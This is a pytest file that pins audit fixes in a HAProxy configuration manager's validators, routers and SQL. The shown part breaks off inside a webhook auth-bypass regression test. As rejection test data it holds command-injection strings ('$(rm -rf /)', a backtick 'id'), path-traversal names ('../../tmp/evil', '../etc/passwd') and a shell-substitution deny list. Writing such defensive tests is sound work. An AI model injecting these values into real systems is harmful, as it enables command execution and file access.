    rules = [{"type": "scheme", "value": "https", "condition": f"acl_{i}"} for i in range(257)]
    with pytest.raises(ValidationError):
        FrontendStep(name="fe", mode="http", bind_port=80, redirect_rules=rules)


def test_bulgu58_redirect_rules_at_cap_accepted():
    from models.site_wizard import FrontendStep
    rules = [{"type": "scheme", "value": "https", "condition": f"acl_{i}"} for i in range(256)]
    fe = FrontendStep(name="fe", mode="http", bind_port=80, redirect_rules=rules)
    assert len(fe.redirect_rules) == 256


# ---- Bulgu #59 — IPv6 scope-id in bind_address ----


def test_bulgu59_ipv6_linklocal_with_scope_id_accepted():
    """Link-local IPv6 with %scope-id (e.g. `[fe80::1%eth0]`) is a
    valid HAProxy bind form — the wizard must allow it."""
    from models.site_wizard import FrontendStep
    fe = FrontendStep(name="fe", mode="http", bind_port=80, bind_address="[fe80::1%eth0]")
    assert fe.bind_address == "[fe80::1%eth0]"


def test_bulgu59_ipv6_with_dotted_zone_accepted():
    """VLAN-style zone names (`%bond0.42`) are commonly used in
    bonded interfaces — accept them too."""
    from models.site_wizard import FrontendStep
    fe = FrontendStep(name="fe", mode="http", bind_port=80, bind_address="[fe80::1%bond0.42]")
    assert fe.bind_address == "[fe80::1%bond0.42]"


def test_bulgu59_plain_ipv6_still_accepted():
    """No regression — bracketed IPv6 without scope id still passes."""
    from models.site_wizard import FrontendStep
    fe = FrontendStep(name="fe", mode="http", bind_port=80, bind_address="[2001:db8::1]")
    assert fe.bind_address == "[2001:db8::1]"


def test_bulgu59_ipv6_scope_id_must_not_be_empty():
    """`[::1%]` (trailing `%` with no zone) is malformed; reject."""
    from models.site_wizard import FrontendStep
    with pytest.raises(ValidationError):
        FrontendStep(name="fe", mode="http", bind_port=80, bind_address="[::1%]")


# ---- Bulgu #60 — preview validates explicit ssl.account_id ----


def test_bulgu60_preview_explicit_account_marker_present():
    """Static-source pin: preview branch for body.ssl.account_id is
    not None must query letsencrypt_accounts directly and surface
    invalid status as a warning."""
    src = _backend_src("routers/site_wizard.py")
    assert "Bulgu #60 (round-20 audit)" in src
    snippet = src[src.find("Bulgu #60"):]
    assert "letsencrypt_accounts" in snippet
    # Distinct warning shapes for missing vs invalid status.
    assert "not found" in snippet
    assert "not 'valid'" in snippet


# ---- Bulgu #62 follow-up — rule signature normalisation ----


def test_bulgu62_followup_signature_normalises_use_backend_prefix():
    """The FE's ACLRuleBuilder parses the DB rule into a structured
    object and serialises it BACK without the `use_backend ` prefix.
    The grandfathering signature must therefore IGNORE the prefix
    and any whitespace collapse — otherwise every PUT on a wizard-
    created frontend looks like a "new" rule and the legitimate
    grandfathering path silently fails."""
    from routers.frontend import _rule_to_signature, _normalize_rule_string

    db_form = "use_backend be-x if acl1 !acl1"
    fe_form = "be-x if acl1 !acl1"
    assert _rule_to_signature(db_form) == _rule_to_signature(fe_form), (
        "Round-tripped FE rule must produce the same signature as the "
        "DB-stored rule so grandfathering works"
    )

    db_redir = "redirect scheme https code 301 if !{ ssl_fc }"
    fe_redir = "scheme https code 301 if !{ ssl_fc }"
    assert _rule_to_signature(db_redir) == _rule_to_signature(fe_redir)

    # Whitespace collapse — extra spaces in DB should not bust the
    # signature either.
    weird = "use_backend   be-x  if   acl1   !acl1"
    assert _rule_to_signature(weird) == _rule_to_signature(fe_form)

    # Direct unit test on the lower-level normaliser.
    assert _normalize_rule_string("use_backend be-x if x") == "be-x if x"
    assert _normalize_rule_string("REDIRECT scheme https") == "scheme https"
    assert _normalize_rule_string("be-x   if    x") == "be-x if x"


def test_bulgu62_followup_grandfathers_after_fe_round_trip():
    """End-to-end pin: simulate the FE flow where the DB has
    `use_backend be-x if acl1 !acl1` and the FE re-sends
    `be-x if acl1 !acl1` (prefix stripped by ACLRuleBuilder).
    The handler must STILL grandfather the contradiction."""
    from models.frontend import FrontendConfig
    from routers.frontend import (
        _enforce_routing_rule_contradictions,
        _rule_to_signature,
    )

    db_rule = "use_backend be-x if acl1 !acl1"
    fe_rule = "be-x if acl1 !acl1"
    fe = FrontendConfig(
        name="fe1", bind_port=81, mode="http",
        use_backend_rules=[fe_rule],
    )
    grand = {_rule_to_signature(db_rule)}
    warnings = _enforce_routing_rule_contradictions(
        fe, grandfathered_signatures=grand,
    )
    assert len(warnings) == 1, (
        "After signature normalisation the FE-stripped rule must hit "
        "the same signature as the DB-prefixed rule and grandfather"
    )


# ---- Bulgu #63 — SSL cert name grandfathering on UPDATE ----


def test_bulgu63_create_handler_rejects_unsafe_cert_name():
    """POST /api/ssl/certificates strictly rejects path-traversal
    names via the new handler-level helper."""
    from fastapi import HTTPException
    from routers.ssl import _assert_safe_cert_name

    for bad in (
        "../../tmp/evil",
        "foo/bar.pem",
        "..",
        ".hidden",
        "-leading-dash",
        " leading-space",
        "trailing-space ",
        "cert (1).pem",
        "*.example.com",
        "cert..pem",
    ):
        with pytest.raises(HTTPException) as exc:
            _assert_safe_cert_name(bad)
        assert exc.value.status_code == 400


def test_bulgu63_create_handler_accepts_safe_cert_name():
    """Safe names must round-trip without raising — covers the
    full character class plus dots."""
    from routers.ssl import _assert_safe_cert_name

    for good in (
        "wildcard.example.com",
        "ca_bundle",
        "letsencrypt-2026-05",
        "cert.pem",
        "internal-cert",
    ):
        _assert_safe_cert_name(good)


def test_bulgu63_update_grandfathers_unchanged_name():
    """The route handler must call `_assert_safe_cert_name` ONLY
    when the operator renames the cert. The model itself no
    longer raises so a PUT that leaves `name` at its current
    (possibly legacy) value rounds-trips. Static-source pin so
    accidental refactors that re-strict the model are caught."""
    src = _backend_src("routers/ssl.py")
    assert "Bulgu #63 (round-22 audit)" in src
    assert "grandfather the existing" in src
    assert "_assert_safe_cert_name(certificate.name)" in src


def test_bulgu63_model_no_longer_rejects_legacy_names():
    """Pin that `SSLCertificateUpdate` accepts non-conforming
    names so legacy DB rows can still be updated on other
    fields. The handler-level helper is the enforcement point
    now."""
    from models.ssl import SSLCertificateUpdate
    legacy = SSLCertificateUpdate(name="cert (1).pem")
    assert legacy.name == "cert (1).pem"


# ---- Bulgu #64 — drop 'system'/'exec'/'eval' substring tripwires ----


def test_bulgu64_legitimate_acl_names_with_system_substring_accepted():
    """`is_system`, `subsystem`, `executable_check`, `evaluate_ip`
    etc. are perfectly normal HAProxy ACL identifiers. Pre-fix
    the substring check rejected them on both wizard and manual
    paths. Pin acceptance now."""
    from models.frontend import FrontendConfig
    fe = FrontendConfig(
        name="fe1",
        bind_port=80,
        mode="http",
        acl_rules=[
            "is_system hdr(host) -i internal.example.com",
            "my_subsystem path_beg /sub",
            "block_executable path_end .exe",
            "eval_engine_acl path_beg /eval-engine",
        ],
    )
    assert len(fe.acl_rules) == 4


def test_bulgu64_use_backend_with_system_token_accepted():
    """Same relaxation for use_backend_rules — a backend name
    containing 'system' must round-trip cleanly."""
    from models.frontend import FrontendConfig
    fe = FrontendConfig(
        name="fe1",
        bind_port=80,
        mode="http",
        use_backend_rules=[
            "be_internal_system if is_internal",
            "be_executable if path_end .bin",
        ],
    )
    assert len(fe.use_backend_rules) == 2


def test_bulgu64_actual_shell_substitution_still_blocked():
    """`$(...)` and backtick must STILL be rejected — they're
    shell-substitution markers with no legitimate place inside
    a HAProxy directive."""
    from models.frontend import FrontendConfig
    from pydantic import ValidationError
    with pytest.raises(ValidationError, match="dangerous"):
        FrontendConfig(
            name="fe1", bind_port=80, mode="http",
            acl_rules=["is_evil path_beg $(rm -rf /)"],
        )
    with pytest.raises(ValidationError, match="dangerous"):
        FrontendConfig(
            name="fe1", bind_port=80, mode="http",
            acl_rules=["is_evil path_beg `id`"],
        )


def test_bulgu64_wizard_relaxation_marker_present():
    """Static-source pin so the wizard's `_DANGEROUS_RULE_PATTERNS`
    tuple stays in its relaxed form."""
    src = _backend_src("models/site_wizard.py")
    assert "Bulgu #64 (round-22 audit)" in src
    assert '_DANGEROUS_RULE_PATTERNS = ("$(", "`")' in src


def test_bulgu64_manual_frontend_relaxation_marker_present():
    """Same source pin for the manual FrontendConfig validators."""
    src = _backend_src("models/frontend.py")
    assert "Bulgu #64 (round-22 audit)" in src


# ---- Bulgu #65 — ALPN/NPN RFC 7301 compatible relaxation ----


def test_bulgu65_alpn_accepts_non_http_protocols():
    """RFC 7301 ALPN tokens are opaque — HAProxy passes them to
    OpenSSL untouched. Pre-fix the whitelist rejected legitimate
    non-HTTP protocols like `postgres`, `imap`, `acme-tls/1`,
    locking out frontends that carried them on UPDATE."""
    from models.frontend import FrontendConfig
    for alpn in ("postgres", "imap", "smtp", "acme-tls/1", "h2,http/1.1"):
        fe = FrontendConfig(
            name="fe1", bind_port=443, mode="http", ssl_alpn=alpn,
        )
        assert fe.ssl_alpn == alpn


def test_bulgu65_alpn_typo_still_rejected_with_hint():
    """The 'http/2 → use h2' UX hint stays — that's a real
    operator typo we want to catch on CREATE."""
    from models.frontend import FrontendConfig
    from pydantic import ValidationError
    for typo in ("http/2", "http2", "http-2"):
        with pytest.raises(ValidationError, match='For HTTP/2'):
            FrontendConfig(
                name="fe1", bind_port=443, mode="http", ssl_alpn=typo,
            )


def test_bulgu65_alpn_malformed_token_rejected():
    """Tokens with embedded spaces / control chars / leading
    punctuation still fail — the new validator only relaxed the
    WHITELIST aspect, not the syntactic-cleanness aspect. Leading /
    trailing whitespace inside a comma-separated entry gets
    stripped (legacy behaviour) so we exercise mid-token spaces
    here instead."""
    from models.frontend import FrontendConfig
    from pydantic import ValidationError
    for bad in ("h 2", "../etc/passwd", "\0null", "?bad"):
        with pytest.raises(ValidationError):
            FrontendConfig(
                name="fe1", bind_port=443, mode="http", ssl_alpn=bad,
            )


def test_bulgu65_marker_present_in_source():
    """Pin the source comment so future refactors don't re-narrow
    the whitelist."""
    src = _backend_src("models/frontend.py")
    assert "Bulgu #65 (round-22 audit)" in src
    assert "RFC 7301" in src


# ---- Bulgu #62 — stale contradictions grandfathered on UPDATE ----


def test_bulgu62_strict_mode_rejects_new_contradiction():
    """POST / strict path — every contradiction blocks. Pins that
    `_enforce_routing_rule_contradictions(grandfathered=None)`
    still raises HTTPException(400)."""
    from fastapi import HTTPException
    from models.frontend import FrontendConfig
    from routers.frontend import _enforce_routing_rule_contradictions

    fe = FrontendConfig(
        name="fe1",
        bind_port=80,
        mode="http",
        use_backend_rules=["be-x if acl1 !acl1"],
    )
    with pytest.raises(HTTPException) as exc:
        _enforce_routing_rule_contradictions(fe, grandfathered_signatures=None)
    assert exc.value.status_code == 400
    assert "X AND NOT X" in exc.value.detail or "contradict" in exc.value.detail.lower() or "positive" in exc.value.detail.lower()


def test_bulgu62_update_path_grandfathers_unchanged_rule():
    """PUT / grandfathered path — when a contradictory rule exists
    UNCHANGED in the DB row, the update returns warnings instead
    of raising 400. The operator can edit unrelated fields without
    being forced to rewrite legacy data first."""
    from models.frontend import FrontendConfig
    from routers.frontend import (
        _enforce_routing_rule_contradictions,
        _rule_to_signature,
    )

    stale = "be-x if acl1 !acl1"
    fe = FrontendConfig(
        name="fe1",
        bind_port=81,
        mode="http",
        use_backend_rules=[stale],
    )
    grand = {_rule_to_signature(stale)}
    warnings = _enforce_routing_rule_contradictions(
        fe, grandfathered_signatures=grand,
    )
    assert len(warnings) == 1
    assert "grandfathered" in warnings[0].lower() or "pre-dated" in warnings[0].lower()


def test_bulgu62_update_path_still_rejects_new_contradiction():
    """PUT path — if the user ADDS a new contradictory rule (or
    modifies an existing one and inserts a contradiction), the
    save still hard-rejects. Only UNCHANGED contradictions
    grandfather."""
    from fastapi import HTTPException
    from models.frontend import FrontendConfig
    from routers.frontend import (
        _enforce_routing_rule_contradictions,
        _rule_to_signature,
    )

    existing = "be-x if acl1 !acl1"
    new = "be-y if acl2 !acl2"
    fe = FrontendConfig(
        name="fe1",
        bind_port=80,
        mode="http",
        use_backend_rules=[existing, new],
    )
    grand = {_rule_to_signature(existing)}
    with pytest.raises(HTTPException) as exc:
        _enforce_routing_rule_contradictions(
            fe, grandfathered_signatures=grand,
        )
    assert exc.value.status_code == 400
    assert "acl2" in exc.value.detail


def test_bulgu62_dict_redirect_rule_does_not_crash_validator():
    """The wizard's auto-generated HTTP→HTTPS redirect is stored
    as a dict `{type, scheme, code, condition}`. Pre-fix the
    `validate_redirect_rules_syntax` validator called `.strip()`
    on every element and 422-ed dict-shaped entries the moment the
    operator opened the FE Management UI to edit an unrelated
    field. The validator must now accept dicts and let the
    handler-level helper inspect `condition`."""
    from models.frontend import FrontendConfig

    fe = FrontendConfig(
        name="fe-acme",
        bind_port=80,
        mode="http",
        redirect_rules=[{
            "type": "scheme",
            "scheme": "https",
            "code": 301,
            "condition": (
                "!{ ssl_fc } "
                "!{ path_beg /.well-known/acme-challenge/ }"
            ),
        }],
    )
    assert isinstance(fe.redirect_rules[0], dict)
    assert fe.redirect_rules[0]["scheme"] == "https"


def test_bulgu62_dict_redirect_rule_condition_contradiction_detected():
    """The handler-level helper must inspect the dict's
    `condition` field so a contradiction inside a dict-shaped
    redirect entry is still caught at create time."""
    from models.frontend import FrontendConfig
    from routers.frontend import _collect_routing_rule_contradictions

    fe = FrontendConfig(
        name="fe-bad",
        bind_port=80,
        mode="http",
        redirect_rules=[{
            "type": "scheme",
            "scheme": "https",
            "code": 301,
            "condition": "acl_bad !acl_bad",
        }],
    )
    conflicts = _collect_routing_rule_contradictions(
        fe.redirect_rules, "redirect_rules",
    )
    assert len(conflicts) == 1
    assert conflicts[0][0] == "redirect_rules"


def test_bulgu62_marker_present_in_router_source():
    """Pin the inline marker so future refactors don't drop the
    handler-level enforcement."""
    src = _backend_src("routers/frontend.py")
    assert "Bulgu #62 (round-22 audit)" in src
    assert "_enforce_routing_rule_contradictions" in src


def test_bulgu62_marker_present_in_model_source():
    """Pin the model-side comment that documents the move."""
    src = _backend_src("models/frontend.py")
    assert "Bulgu #62 (round-22 audit)" in src


# ---- Bulgu #61 — backend balance_method='uri' + mode='tcp' reject ----


def test_bulgu61_tcp_backend_with_balance_uri_rejected():
    """`balance uri` is documented HTTP-only in HAProxy section 4.2;
    rendering it inside a TCP backend block parses-errors at agent
    reload."""
    from models.site_wizard import BackendStep
    with pytest.raises(ValidationError, match="HTTP-only field"):
        BackendStep(name="be", mode="tcp", balance_method="uri")


def test_bulgu61_tcp_backend_with_roundrobin_accepted():
    """No regression: every other accepted balance method continues
    to work on TCP backends."""
    from models.site_wizard import BackendStep
    for method in ("roundrobin", "leastconn", "static-rr", "first", "source", "random"):
        be = BackendStep(name=f"be-{method}", mode="tcp", balance_method=method)
        assert be.balance_method == method


def test_bulgu61_http_backend_with_balance_uri_accepted():
    """HTTP-mode backends carry `balance uri` correctly."""
    from models.site_wizard import BackendStep
    be = BackendStep(name="be", mode="http", balance_method="uri")
    assert be.balance_method == "uri"


def test_bulgu61_marker_present_in_source():
    """Pin the inline marker so future refactors don't drop the
    guard."""
    src = _backend_src("models/site_wizard.py")
    assert "Bulgu #61 (round-21 audit)" in src


# ---- Round 20 static-source markers ----


def test_round20_static_markers_present():
    """Pin all round-20 Bulgu markers so future refactors don't
    silently drop the guards."""
    src_models = _backend_src("models/site_wizard.py")
    src_router = _backend_src("routers/site_wizard.py")
    for marker in (
        "Bulgu #58 (round-20 audit)",
        "Bulgu #59 (round-20)",
    ):
        assert marker in src_models, (
            f"Round 20 marker missing from models/site_wizard.py: {marker}"
        )
    assert "Bulgu #60 (round-20 audit)" in src_router, (
        "Round 20 marker missing from routers/site_wizard.py: #60"
    )


# ---- Round 19 static-source markers ----


def test_round19_static_markers_present():
    """Pin all round-19 Bulgu markers so future refactors don't
    silently drop the guards."""
    src_models = _backend_src("models/site_wizard.py")
    src_router = _backend_src("routers/site_wizard.py")
    # Models: TCP-mode header reject (#56), TCP+HSTS reject (#57).
    for marker in (
        "Bulgu #56 (round-19 audit)",
        "Bulgu #57 (round-19 audit)",
    ):
        assert marker in src_models, (
            f"Round 19 marker missing from models/site_wizard.py: {marker}"
        )
    # Router: cluster-advisory-lock + in-tx re-check (#54), no-online-
    # agents preview warning (#55).
    for marker in (
        "Bulgu #54 (round-19 audit)",
        "Bulgu #55 (round-19 audit)",
    ):
        assert marker in src_router, (
            f"Round 19 marker missing from routers/site_wizard.py: {marker}"
        )


# ---- Bulgu #66 — align manual FrontendConfig numeric bounds with wizard ----


def test_bulgu66_maxconn_accepts_wizard_upper_bound():
    """Pre-fix the manual FrontendConfig capped `maxconn` at
    100_000 while the wizard's `FrontendStep` allowed up to
    1_000_000. A frontend created via the wizard with
    `maxconn > 100_000` would therefore 422 on the very first
    PUT from the FrontendManagement UI — exactly the
    Bulgu #62 'stale data blocks unrelated edit' pattern. The
    new bound matches the wizard byte-for-byte."""
    from models.frontend import FrontendConfig
    fe = FrontendConfig(
        name="legacy_fe", bind_port=80, mode="http", maxconn=500_000,
    )
    assert fe.maxconn == 500_000
    fe = FrontendConfig(
        name="legacy_fe", bind_port=80, mode="http", maxconn=1_000_000,
    )
    assert fe.maxconn == 1_000_000


def test_bulgu66_maxconn_still_rejects_overflow():
    """The wizard's defensive 1M ceiling still applies — anything
    larger is almost certainly a typo or DoS-shaped input."""
    from models.frontend import FrontendConfig
    from pydantic import ValidationError
    with pytest.raises(ValidationError, match='1000000'):
        FrontendConfig(
            name="fe1", bind_port=80, mode="http", maxconn=1_000_001,
        )


def test_bulgu66_rate_limit_accepts_zero_and_wizard_bound():
    """Pre-fix the manual model required `rate_limit >= 1` while
    the wizard allowed `rate_limit = 0` (explicit 'disabled'
    sentinel). A wizard-created frontend with the rate-limit
    feature OFF would 422 on update."""
    from models.frontend import FrontendConfig
    for rl in (0, 1, 10_000, 1_000_000):
        fe = FrontendConfig(
            name="fe1", bind_port=80, mode="http", rate_limit=rl,
        )
        assert fe.rate_limit == rl


def test_bulgu66_rate_limit_still_rejects_overflow_and_negative():
    """Both ends of the range stay guarded — only the inner
    band widens."""
    from models.frontend import FrontendConfig
    from pydantic import ValidationError
    with pytest.raises(ValidationError):
        FrontendConfig(
            name="fe1", bind_port=80, mode="http", rate_limit=-1,
        )
    with pytest.raises(ValidationError):
        FrontendConfig(
            name="fe1", bind_port=80, mode="http", rate_limit=1_000_001,
        )


def test_bulgu66_timeout_client_accepts_wizard_range():
    """Wizard accepts 100..86_400_000 ms; manual pre-fix required
    1000..3_600_000. Mid-second `timeout_client=500` and 4h+
    long-poll setups both 422'd on update. New range matches
    HAProxy's int32 ms ceiling guarded by the wizard."""
    from models.frontend import FrontendConfig
    for tc in (100, 500, 3_600_000, 86_400_000):
        fe = FrontendConfig(
            name="fe1", bind_port=80, mode="http", timeout_client=tc,
        )
        assert fe.timeout_client == tc


def test_bulgu66_timeout_http_request_accepts_wizard_range():
    """Same alignment story — pre-fix the manual model capped
    timeout_http_request at 5 minutes while the wizard allowed
    up to 24h. Any legacy frontend tuned for slow webhook
    integrations would 422 on unrelated edits."""
    from models.frontend import FrontendConfig
    for thr in (100, 5_000, 300_000, 86_400_000):
        fe = FrontendConfig(
            name="fe1", bind_port=80, mode="http", timeout_http_request=thr,
        )
        assert fe.timeout_http_request == thr


def test_bulgu66_timeout_bounds_still_guard_overflow():
    """Defensive ceilings still hold. `timeout_client=0` is a
    HAProxy-special 'no timeout' value that the wizard
    deliberately blocks (operator footgun) — we match."""
    from models.frontend import FrontendConfig
    from pydantic import ValidationError
    with pytest.raises(ValidationError):
        FrontendConfig(
            name="fe1", bind_port=80, mode="http", timeout_client=0,
        )
    with pytest.raises(ValidationError):
        FrontendConfig(
            name="fe1", bind_port=80, mode="http", timeout_client=86_400_001,
        )
    with pytest.raises(ValidationError):
        FrontendConfig(
            name="fe1", bind_port=80, mode="http", timeout_http_request=0,
        )


def test_bulgu66_marker_present_in_source():
    """Pin the source comment so a future audit doesn't silently
    re-tighten one side of the bounds and reintroduce the
    'wizard accepted / manual rejects' divergence."""
    src = _backend_src("models/frontend.py")
    assert "Bulgu #66 (round-22 audit)" in src
    assert "align manual FrontendConfig" in src


# ---- Bulgu #68 — BackendConfig fullconn=0 accepted (wizard parity) ----


def test_bulgu68_backend_config_accepts_fullconn_zero():
    """Pre-fix the manual BackendConfig's `check_positive` validator
    rejected `fullconn=0` (the HAProxy 'disable fullconn' sentinel)
    even though the wizard's `BackendStep` declares
    `fullconn: Field(default=None, ge=0, ...)` — i.e. allows
    0. A wizard-created backend with `fullconn` left at the
    default-then-zeroed value would 422 on every manual PUT,
    blocking the operator from changing the balance method
    or adding a server. Same Bulgu #62 'wizard accepted /
    manual rejects' lockout pattern."""
    from models.backend import BackendConfig, BackendConfigUpdate
    cfg = BackendConfig(
        name="be1", cluster_id=1, fullconn=0,
    )
    assert cfg.fullconn == 0
    upd = BackendConfigUpdate(fullconn=0)
    assert upd.fullconn == 0


def test_bulgu68_backend_config_still_rejects_negative_fullconn():
    """Negative `fullconn` makes no HAProxy sense and the
    wizard's `ge=0` also rejects it. Pin parity here."""
    from models.backend import BackendConfig, BackendConfigUpdate
    from pydantic import ValidationError
    with pytest.raises(ValidationError, match='fullconn'):
        BackendConfig(name="be1", cluster_id=1, fullconn=-1)
    with pytest.raises(ValidationError, match='fullconn'):
        BackendConfigUpdate(fullconn=-100)


def test_bulgu68_timeouts_still_reject_zero():
    """The other four fields (`health_check_interval`,
    `timeout_connect`, `timeout_server`, `timeout_queue`) keep
    the strict `> 0` requirement — HAProxy's parser rejects
    `timeout server 0` outright."""
    from models.backend import BackendConfig
    from pydantic import ValidationError
    for fld in (
        "health_check_interval", "timeout_connect",
        "timeout_server", "timeout_queue",
    ):
        with pytest.raises(ValidationError):
            BackendConfig(name="be1", cluster_id=1, **{fld: 0})


def test_bulgu68_marker_present_in_source():
    src = _backend_src("models/backend.py")
    assert "Bulgu #68 (round-22 audit)" in src


# ---- Bulgu #69 — Frontend name length aligned with wizard (50 → 64) ----


def test_bulgu69_frontend_name_accepts_wizard_length():
    """Wizard's `_FRONTEND_NAME_REGEX = '^[a-zA-Z][a-zA-Z0-9_-]{0,63}$'`
    allows up to 64 characters. Pre-fix the manual `FrontendConfig`
    capped at 50, so a wizard-created frontend named e.g.
    `tenant-acme-app-frontend-https-public-edge-01234567` (60+
    chars) would 422 on every manual PUT. Same Bulgu #62 lockout
    pattern."""
    from models.frontend import FrontendConfig
    name_60 = "a" + ("b" * 59)
    assert len(name_60) == 60
    fe = FrontendConfig(name=name_60, bind_port=80, mode="http")
    assert fe.name == name_60
    name_64 = "a" + ("b" * 63)
    assert len(name_64) == 64
    fe = FrontendConfig(name=name_64, bind_port=80, mode="http")
    assert fe.name == name_64


def test_bulgu69_frontend_name_still_rejects_too_long():
    """Defensive ceiling stays at 64 — anything past that is a
    typo or operator confusion (HAProxy itself has no hard cap
    but the rendered config readability degrades fast)."""
    from models.frontend import FrontendConfig
    from pydantic import ValidationError
    with pytest.raises(ValidationError, match='64 characters'):
        FrontendConfig(name="a" * 65, bind_port=80, mode="http")


def test_bulgu69_marker_present_in_source():
    src = _backend_src("models/frontend.py")
    assert "Bulgu #69 (round-22 audit)" in src


# ---- Bulgu #71 — use_backend filter exact-token match on delete ----


def test_bulgu71_extract_use_backend_target_handles_both_shapes():
    """The FE rule builder strips the `use_backend` keyword on
    round-trip, so the DB holds both shapes in the same JSONB
    column. The parser must understand both."""
    from routers.backend import _extract_use_backend_target
    assert _extract_use_backend_target("api if is_api") == "api"
    assert _extract_use_backend_target("use_backend api if is_api") == "api"
    assert _extract_use_backend_target("use_backend  api  if  is_api") == "api"
    assert _extract_use_backend_target("Use_Backend api if X") == "api"  # case-insensitive keyword
    assert _extract_use_backend_target("") is None
    assert _extract_use_backend_target("   ") is None
    assert _extract_use_backend_target(None) is None
    assert _extract_use_backend_target({"type": "scheme"}) is None


def test_bulgu71_delete_filter_does_not_match_substring_siblings():
    """Pre-fix `[r for r in rules if backend_name not in r]`
    deleted sibling backends whose names contained the deleted
    backend's name as a substring (api → api-v2, mobile_api,
    apicall, …). Pin the exact-token behaviour."""
    from routers.backend import _extract_use_backend_target
    rules = [
        "api if is_api",
        "api-v2 if is_apiv2",
        "mobile_api if is_mob",
        "apicall if /^api/",
        "use_backend api if is_api2",
    ]
    deleted = "api"
    surviving = [r for r in rules if _extract_use_backend_target(r) != deleted]
    # The two "api" entries die, the three sibling backends live.
    assert surviving == [
        "api-v2 if is_apiv2",
        "mobile_api if is_mob",
        "apicall if /^api/",
    ]


def test_bulgu71_acl_rules_no_longer_touched_on_backend_delete():
    """The pre-fix code also filtered acl_rules with the same
    naive `in` check, wiping reusable predicates like
    `is_api hdr(host) -i api.example.com` whenever a backend
    named 'api' was deleted. The new contract: acl_rules are
    PRESERVED on backend delete (they're predicates, not
    backend-coupled). Pin via static source check."""
    src = _backend_src("routers/backend.py")
    # The post-fix code preserves acl_rules verbatim. The pre-fix
    # filter expression `[rule for rule in acl_rules if
    # backend_name not in rule]` must NOT appear (the comment
    # below the fix mentions the pattern in prose — match on the
    # code form, not the prose form).
    assert "for rule in acl_rules if backend_name not in rule" not in src
    assert "filtered_acl = list(acl_rules)" in src


def test_bulgu71_marker_present_in_source():
    src = _backend_src("routers/backend.py")
    assert "Bulgu #71" in src


# ---- Bulgu #72 — backend rename cascades to use_backend_rules ----


def test_bulgu72_rename_use_backend_target():
    """Rename helper preserves the `use_backend ` prefix (or
    absence thereof) byte-for-byte, only swaps the target name,
    and only touches rules that target the OLD name."""
    from routers.backend import _rename_use_backend_target
    assert _rename_use_backend_target(
        "api if is_api", "api", "api-v2"
    ) == "api-v2 if is_api"
    assert _rename_use_backend_target(
        "use_backend api if is_api", "api", "api-v2"
    ) == "use_backend api-v2 if is_api"
    # Unrelated rule passes through untouched.
    assert _rename_use_backend_target(
        "other-backend if X", "api", "api-v2"
    ) == "other-backend if X"
    # Substring sibling NOT renamed (the bug pre-fix could have
    # done this if the helper was naive).
    assert _rename_use_backend_target(
        "api-v2 if X", "api", "renamed-api"
    ) == "api-v2 if X"


def test_bulgu72_marker_present_in_source():
    src = _backend_src("routers/backend.py")
    assert "Bulgu #72 (round-22 audit)" in src
    assert "cascade the rename" in src or "cascade" in src.lower()


# ---- Bulgu #73 — backend_servers rename scoped to cluster_id ----


def test_bulgu73_servers_rename_uses_cluster_id_filter():
    """Pin the SQL scope so a future refactor doesn't drop the
    cluster_id predicate again — the multi-tenant pollution
    bug pre-fix renamed servers ACROSS clusters."""
    src = _backend_src("routers/backend.py")
    # The fixed SQL clearly scopes both the IS NULL legacy branch
    # AND the explicit cluster_id branch.
    assert "WHERE backend_name = $2 AND cluster_id = $3" in src
    assert "WHERE backend_name = $2 AND cluster_id IS NULL" in src
    assert "Bulgu #73 (round-22 audit)" in src


# ---- Bulgu #74 — SSL cert delete refuses to wipe in-use cert ----


def test_bulgu74_ssl_delete_signature_has_force_param():
    """The new delete handler MUST expose a `force: bool` kwarg —
    that's the entire escape hatch for the 409 conflict path. A
    refactor that drops it would silently re-enable the orphan-
    reference bug. Source-level pin."""
    src = _backend_src("routers/ssl.py")
    assert "async def delete_ssl_certificate(" in src
    assert "force: bool = False" in src
    assert "Bulgu #74 (round-22 audit)" in src


def test_bulgu74_referential_check_covers_both_columns():
    """The legacy single-cert column AND the multi-cert JSONB
    array MUST both be checked, otherwise the JSONB-cleared-but-
    legacy-still-set path leaks. Pin the SQL fragments."""
    src = _backend_src("routers/ssl.py")
    # Both branches present in the pre-delete check.
    assert "ssl_certificate_id = $1" in src
    assert "ssl_certificate_ids @> to_jsonb($1::int)" in src
    # JSONB array element removal MUST use the `- $1::text` form
    # so the integer is identified by its string key, not by
    # cardinal index.
    assert "ssl_certificate_ids = COALESCE(ssl_certificate_ids, '[]'::jsonb)" in src


def test_bulgu74_conflict_returns_409_not_500():
    """The conflict response is 409 (Conflict), not 400 / 500 —
    that's what FE / API clients branch on to surface the
    'force?' confirmation dialog instead of a generic error."""
    src = _backend_src("routers/ssl.py")
    assert "status_code=409" in src


# ---- Bulgu #75 — agent webhook auth-bypass (no key == accepted) ----


def test_bulgu75_agent_webhooks_require_present_key():
    """Pre-fix every webhook (config-applied, config-validation-
    failed, config-sync, upgrade-complete, config-response) used
    the pattern:

        if x_api_key and not agent_auth:
            raise HTTPException(401, ...)

    which short-circuited when `x_api_key` was empty/None,
    accepting unauthenticated requests. Static pin: each
    webhook function body must contain the FIXED form
    `if not agent_auth` and NOT the broken form. We exclude
    the heartbeat endpoint, which intentionally accepts
    no-key during agent bootstrap registration (separate
    threat-model justified by the agent self-registration
    flow)."""
    import re as _re

    def _function_bodies(src: str):
        """Yield (fn_name, body_text) for every async def in src."""
        positions = [
            (m.group(1), m.start()) for m in
            _re.finditer(r"async def (\w+)\(", src)
        ]
        for i, (name, start) in enumerate(positions):
            end = positions[i + 1][1] if i + 1 < len(positions) else len(src)
            yield name, src[start:end]

    agent_webhooks = {
        "agent_config_applied_notification",
        "agent_config_validation_failed",
        "agent_config_sync",
        "agent_upgrade_complete",
    }
    src_agent = _backend_src("routers/agent.py")
    found = set()
    for name, body in _function_bodies(src_agent):
        if name in agent_webhooks:
            found.add(name)
            # The CODE — not the comment quoting the old pattern.
            # Strip leading-hash comments per line, then check.
            code_only = "\n".join(
                line for line in body.split("\n")
                if not line.strip().startswith("#")
            )
            assert "if x_api_key and not agent_auth:" not in code_only, (
                f"Bulgu #75 regression in routers/agent.py::{name}: "
                f"auth-bypass pattern still present in CODE"
            )
            assert "if not agent_auth:" in code_only, (
                f"Bulgu #75: routers/agent.py::{name} missing the "
                f"fixed `if not agent_auth` guard"
            )
    assert found == agent_webhooks, f"Missing webhooks: {agent_webhooks - found}"

    # configuration.py — submit_config_response.
    src_cfg = _backend_src("routers/configuration.py")
    for name, body in _function_bodies(src_cfg):
        if name == "submit_config_response":
            code_only = "\n".join(
                line for line in body.split("\n")
                if not line.strip().startswith("#")
            )
